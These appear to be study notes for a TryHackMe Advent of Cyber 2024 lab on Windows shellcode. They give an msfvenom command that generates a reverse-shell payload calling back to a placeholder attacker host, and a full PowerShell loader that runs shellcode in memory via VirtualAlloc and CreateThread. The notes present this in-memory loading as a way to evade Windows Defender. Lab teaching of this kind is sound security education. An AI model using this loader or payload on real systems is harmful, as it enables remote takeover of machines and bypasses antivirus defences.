## Shellcodes of the world, unite!

[Unlock the World of Shellcode - Day 8 of TryHackMe Advent of Cyber 2024](https://www.youtube.com/watch?v=ZBZhfu1A3Fw)
### Essential Terminologies

- **Shellcode**: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
- **PowerShell**: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.
- **Windows Defender**: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognize known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defenses. We will cover the latter one in this task. 
- **Windows API**: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`, which we will also use in this task for exploitation.
- **Accessing Windows API through PowerShell Reflection**: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.
- **Reverse shell**: A type of connection in which the target (the machine you're trying to hack) initiates a connection back to your attacking machine.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```

- `-p windows/x64/shell_reverse_tcp`: The `-p` flag tells `msfvenom` what type of payload to create. `windows/x64/shell_reverse_tcp` specifies that we want a reverse shell for a Windows machine.
- `LHOST=ATTACKBOX_IP`: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.
- `LPORT=1111`: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (`1111` in this example). You can choose any available port, but it needs to match with what your listener is set to.
- `-f powershell`: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine.

```cs
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices; 

public class VrtAlloc{ 
	[DllImport("kernel32")] 
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
} 
"@ 

Add-Type $VrtAlloc 

$WaitFor= @" 
using System; 
using System.Runtime.InteropServices; 

public class WaitFor{ 
	[DllImport("kernel32.dll", SetLastError=true)] 
		public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
} 
"@ 

Add-Type $WaitFor 

$CrtThread= @" 
using System; 
using System.Runtime.InteropServices; 

public class CrtThread{ 
	[DllImport("kernel32", CharSet=CharSet.Ansi)] 
		public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 

} 
"@ 
Add-Type $CrtThread 

[Byte[]] $buf = SHELLCODE_PLACEHOLDER 
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) 
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) 
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

**Explanation of the Code**

The script starts by defining a few C# classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API.  

- `VirtualAlloc`: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.
- `CreateThread`: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.
- `WaitForSingleObject`: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.

These classes are then added to PowerShell using the `Add-Type` command, allowing PowerShell to use these functions.

**Storing the Shellcode in a Byte Array**

Next, the script stores the shellcode in the `$buf` variable, a byte array. In the example above, `SHELLCODE_PLACEHOLDER` is just there to show where you would insert the actual shellcode earlier generated through `msfvenom`. Usually, you'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.

**Allocating Memory for the Shellcode**

The `VirtualAlloc` function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:

- `0` for the memory address, meaning that Windows will decide where to allocate the memory.
- `$size` for the size of the memory block, which is determined by the length of the shellcode.
- `0x3000` for the allocation type, which tells Windows to reserve and commit the memory.
- `0x40` for memory protection, the memory is readable and executable (necessary for executing shellcode).

After memory is allocated, the `Marshal.Copy` function copies the shellcode from the `$buf` array into the allocated memory address (`$addr`), preparing it for execution.

**Executing the Shellcode and Waiting for Completion**

Once the shellcode is stored in memory, the script calls the `CreateThread` function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). The script then uses the `WaitForSingleObject` function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.
